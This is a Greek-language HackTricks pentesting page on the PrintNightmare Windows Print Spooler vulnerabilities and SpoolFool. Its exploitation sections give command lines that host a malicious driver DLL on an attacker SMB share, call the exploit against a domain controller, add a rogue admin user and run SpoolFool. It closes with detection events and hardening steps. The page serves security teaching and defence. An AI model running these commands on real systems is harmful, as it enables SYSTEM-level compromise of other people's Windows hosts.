# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> Το PrintNightmare είναι η συλλογική ονομασία μιας οικογένειας ευπαθειών στην υπηρεσία **Print Spooler** των Windows, οι οποίες επιτρέπουν **εκτέλεση αυθαίρετου κώδικα ως SYSTEM** και, όταν το spooler είναι προσβάσιμο μέσω RPC, **απομακρυσμένη εκτέλεση κώδικα (RCE) σε domain controllers και file servers**. Τα CVE που έχουν γίνει αντικείμενο της ευρύτερης εκμετάλλευσης είναι τα **CVE-2021-1675** (αρχικά ταξινομήθηκε ως LPE) και **CVE-2021-34527** (πλήρες RCE). Μεταγενέστερα ζητήματα, όπως τα **CVE-2021-34481 (“Point & Print”)** και **CVE-2022-21999 (“SpoolFool”)**, αποδεικνύουν ότι η επιφάνεια επίθεσης απέχει πολύ από το να έχει κλείσει.

Αν αναζητάτε **εξαναγκασμό ελέγχου ταυτότητας / relay** μέσω του spooler αντί για **RCE/LPE μέσω driver**, δείτε [αυτή την άλλη σελίδα σχετικά με την κατάχρηση printer coercion](printers-spooler-service-abuse.md). Αυτή η σελίδα εστιάζει στη **φόρτωση drivers / DLLs ως SYSTEM**.

---

## 1. Ευπαθή στοιχεία και CVE

| Year | CVE | Short name | Primitive | Notes |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Διορθώθηκε στο CU του Ιουνίου 2021, αλλά παρακάμφθηκε μέσω του CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|Το `AddPrinterDriverEx` επιτρέπει σε authenticated users να φορτώνουν DLL driver από απομακρυσμένο share· μετά τον Αύγουστο του 2021, αυτό συνήθως απαιτεί εξασθενημένες πολιτικές Point & Print|
|2021|CVE-2021-34481|“Point & Print”|LPE|Εγκατάσταση unsigned driver από χρήστες που δεν είναι admins|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Δημιουργία αυθαίρετου καταλόγου → DLL planting – λειτουργεί μετά τα patches του 2021|

Όλα εκμεταλλεύονται μία από τις **μεθόδους RPC MS-RPRN / MS-PAR** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) ή σχέσεις εμπιστοσύνης στο **Point & Print**.

## 2. Τεχνικές εκμετάλλευσης

### 2.1 Παραβίαση απομακρυσμένου Domain Controller (CVE-2021-34527)

Ένας authenticated αλλά **μη προνομιούχος** χρήστης domain μπορεί να εκτελέσει αυθαίρετα DLL ως **NT AUTHORITY\SYSTEM** σε απομακρυσμένο spooler (συχνά στον DC), κάνοντας τα εξής:

```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
       -f \
       '\\attacker_IP\share\evil.dll'
```

Δημοφιλή PoCs περιλαμβάνουν τα **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) και τα modules `misc::printnightmare / lsa::addsid` του Benjamin Delpy στο **mimikatz**.

### 2.2 Τοπική κλιμάκωση προνομίων (κάθε υποστηριζόμενη έκδοση Windows, 2021-2024)

Μπορείτε να καλέσετε το ίδιο API **τοπικά** για να φορτώσετε ένα driver από το `C:\Windows\System32\spool\drivers\x64\3\` και να αποκτήσετε προνόμια SYSTEM:

```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```

### 2.3 Σύγχρονη διαλογή σε ενημερωμένους hosts

Σε έναν πλήρως ενημερωμένο host, τα δημόσια PrintNightmare PoCs συχνά αποτυγχάνουν, επειδή τα Windows πλέον απαιτούν από προεπιλογή δικαιώματα διαχειριστή για την εγκατάσταση drivers εκτυπωτών (`RestrictDriverInstallationToAdministrators=1` από τις 10 Αυγούστου 2021). Προτού δοκιμάσετε ένα exploit σε έναν στόχο, ελέγξτε πρώτα αν το περιβάλλον έχει αναιρέσει αυτήν την αλλαγή ασφαλείας για παλαιότερες εγκαταστάσεις εκτυπωτών:<sup>[[3]](#references)</sup>

```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```

Οι δύο πιο ενδιαφέρουσες ευάλωτες τιμές είναι συνήθως:<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Από Linux, επιβεβαιώστε γρήγορα ότι ο στόχος εκθέτει τις σχετικές διεπαφές print RPC πριν εκτελέσετε ένα PoC:

```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```

Ορισμένα νεότερα δημόσια εργαλεία σάς προσφέρουν επίσης μια ασφαλέστερη ροή εργασίας **check/list** πριν από την αποστολή ενός DLL:

```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```

> Αν λάβετε `RPC_E_ACCESS_DENIED` (`0x8001011b`) ως χρήστης με χαμηλά προνόμια, συνήθως βλέπετε την προεπιλεγμένη συμπεριφορά μετά το 2021 και όχι αποτυχία μεταφοράς.

> Στα Windows 11 22H2+ και σε νεότερες εκδόσεις client, η απομακρυσμένη εκτύπωση χρησιμοποιεί από προεπιλογή **RPC over TCP**, ενώ το **RPC over named pipes** (`\PIPE\spoolss`) είναι απενεργοποιημένο, εκτός αν ενεργοποιηθεί ξανά ρητά. Ορισμένα παλαιότερα PoC και σημειώσεις εργαστηρίων εξακολουθούν να θεωρούν ότι το named pipe είναι προσβάσιμο.<sup>[[4]](#references)</sup>

### 2.4 Κατάχρηση του Package Point & Print σε δίκτυα που έχουν «διορθωθεί»

Πολλά εταιρικά περιβάλλοντα παρέμειναν **ευάλωτα λόγω πολιτικής** μετά τις αρχικές ενημερώσεις κώδικα του 2021, επειδή οι ροές εργασιών του helpdesk ή του print server εξακολουθούσαν να απαιτούν από χρήστες που δεν ήταν διαχειριστές να εγκαθιστούν/ενημερώνουν drivers. Στην πράξη, το επιθετικό playbook γίνεται:

- Αν τα μηνύματα προειδοποίησης ασφαλείας είναι πλήρως απενεργοποιημένα, το **κλασικό PrintNightmare με αυθαίρετο DLL** παραμένει η συντομότερη διαδρομή.
- Αν είναι ενεργοποιημένο το `Only use Package Point and Print`, συνήθως χρειάζεται pivot σε διαδρομή με **signed driver που υποστηρίζει packages**, αντί για απλή απόθεση DLL.<sup>[[3]](#references)</sup>
- Έρευνα του 2024 έδειξε ότι το **`Package Point and Print - Approved servers` δεν αποτελεί από μόνο του αυστηρό όριο εμπιστοσύνης**: αν ένας attacker μπορεί να παραποιήσει ή να υποκλέψει την επίλυση ονομάτων για έναν εγκεκριμένο print server, τα θύματα μπορούν και πάλι να ανακατευθυνθούν σε κακόβουλο server που περνά τους ελέγχους πολιτικής.<sup>[[4]](#references)</sup>
- Ακόμη και ο συνδυασμός UNC hardening με εξαναγκασμό RPC-over-SMB μπορεί να είναι εύθραυστος, επειδή οι σύγχρονοι clients ενδέχεται να **επιστρέψουν στο RPC over TCP**.<sup>[[4]](#references)</sup>

Γι’ αυτό η σύγχρονη εκμετάλλευση τύπου PrintNightmare αφορά συχνά περισσότερο την **κατάχρηση της εταιρικής πολιτικής ανάπτυξης εκτυπωτών** παρά την αυτούσια επανάληψη του αρχικού PoC του 2021.

### 2.5 SpoolFool (CVE-2022-21999) – παράκαμψη των διορθώσεων του 2021

Οι ενημερώσεις κώδικα της Microsoft το 2021 απέκλεισαν τη φόρτωση απομακρυσμένων drivers, αλλά **δεν ενίσχυσαν τα δικαιώματα καταλόγων**. Το SpoolFool καταχράται την παράμετρο `SpoolDirectory` για να δημιουργήσει έναν αυθαίρετο κατάλογο μέσα στο `C:\Windows\System32\spool\drivers\`, να αποθέσει ένα payload DLL και να αναγκάσει το spooler να το φορτώσει:<sup>[[2]](#references)</sup>

```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```

> Το exploit λειτουργεί σε πλήρως ενημερωμένα Windows 7 → Windows 11 και Server 2012R2 → 2022, πριν από τις ενημερώσεις του Φεβρουαρίου 2022<sup>[[2]](#references)</sup>

---

## 3. Εντοπισμός & hunting

* **PrintService logs** – ενεργοποιήστε το κανάλι *Microsoft-Windows-PrintService/Operational* και παρακολουθήστε το **Event ID 316** (προσθήκη/ενημέρωση driver, συνήθως περιλαμβάνει τα ονόματα των DLL) τόσο για επιτυχημένες όσο και για αποτυχημένες απόπειρες. Συνδυάστε το με τα **Event ID 808/811** για ύποπτες αποτυχίες φόρτωσης module/driver του spooler.
* **Sysmon** – `Event ID 7` (Image loaded) ή `11/23` (File write/delete) μέσα στο `C:\Windows\System32\spool\drivers\*` όταν η γονική διεργασία είναι το **spoolsv.exe**.
* **Process lineage** – δημιουργήστε alert κάθε φορά που το **spoolsv.exe** εκκινεί `cmd.exe`, `rundll32.exe`, PowerShell ή οποιαδήποτε μη αναμενόμενη μη υπογεγραμμένη child process.
* **Network telemetry** – μη αναμενόμενες λήψεις SMB από το **spoolsv.exe** προς shares που ελέγχονται από attacker ή ασυνήθιστη κίνηση printer RPC από servers που δεν θα έπρεπε να λειτουργούν ως print servers αποτελούν ενδείξεις υψηλής αξίας.

## 4. Αντιμετώπιση & hardening

1. **Εγκαταστήστε ενημερώσεις!** – Εφαρμόστε την πιο πρόσφατη cumulative update σε κάθε Windows host όπου είναι εγκατεστημένη η υπηρεσία Print Spooler.
2. **Απενεργοποιήστε τον spooler όπου δεν είναι απαραίτητος**, ιδιαίτερα στους Domain Controllers:
   ```powershell
   Stop-Service Spooler -Force
   Set-Service Spooler -StartupType Disabled
   ```
3. **Αποκλείστε τις απομακρυσμένες συνδέσεις** επιτρέποντας ταυτόχρονα την τοπική εκτύπωση – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Διατηρήστε το Point & Print αποκλειστικά για διαχειριστές** ορίζοντας:
   ```cmd
   reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
           /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
   ```
   Λεπτομερείς οδηγίες στο Microsoft KB5005652<sup>[[1]](#references)</sup>
5. Αν οι επιχειρησιακές απαιτήσεις επιβάλλουν `RestrictDriverInstallationToAdministrators=0`, αντιμετωπίστε κάθε άλλη πολιτική εκτυπωτών μόνο ως **μερικό μέτρο μετριασμού**. Τουλάχιστον, προτιμήστε **package-aware drivers**, ενεργοποιήστε το **Only use Package Point and Print** και περιορίστε το **Package Point and Print - Approved servers** σε ρητά καθορισμένους print servers εντός του forest.<sup>[[3]](#references)</sup>
6. **Μην αναιρείτε το απόρρητο RPC των εκτυπωτών** απλώς για να διορθώσετε κατεστραμμένες αντιστοιχίσεις εκτυπωτών. Τα περιβάλλοντα που ορίζουν `RpcAuthnLevelPrivacyEnabled=0` αναιρούν τη θωράκιση που προστέθηκε για το **CVE-2021-1678** και συνήθως απαιτούν επιπλέον έλεγχο κατά τη διάρκεια ενός engagement.<sup>[[4]](#references)</sup>

---

## 5. Σχετική έρευνα / εργαλεία

* Modules `printnightmare` του [mimikatz](https://github.com/gentilkiwi/mimikatz/tree/master/modules)
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – τυπική υλοποίηση Impacket με λειτουργίες `-check`, `-list` και `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper με ενσωματωμένη παράδοση μέσω SMB, υποστήριξη πολλαπλών στόχων και λειτουργίες `MS-RPRN` / `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – κατάχρηση ευάλωτου printer driver που παρέχει ο επιτιθέμενος μέσω του package Point & Print
* Exploit και write-up του SpoolFool
* Micropatches του 0patch για το SpoolFool και άλλα σφάλματα του spooler

Αν θέλετε να **εξαναγκάσετε έλεγχο ταυτότητας** μέσω του spooler αντί να φορτώσετε driver, μεταβείτε στην [κατάχρηση της υπηρεσίας printer spooler](printers-spooler-service-abuse.md).

---

## References

- [1] [Microsoft – KB5005652: Διαχείριση της νέας προεπιλεγμένης συμπεριφοράς εγκατάστασης driver του Point & Print](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – Ένας πρακτικός οδηγός για το PrintNightmare το 2024](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – Το PrintNightmare δεν έχει τελειώσει ακόμα](https://itm4n.github.io/printnightmare-not-over/)
{{#include ../../banners/hacktricks-training.md}}
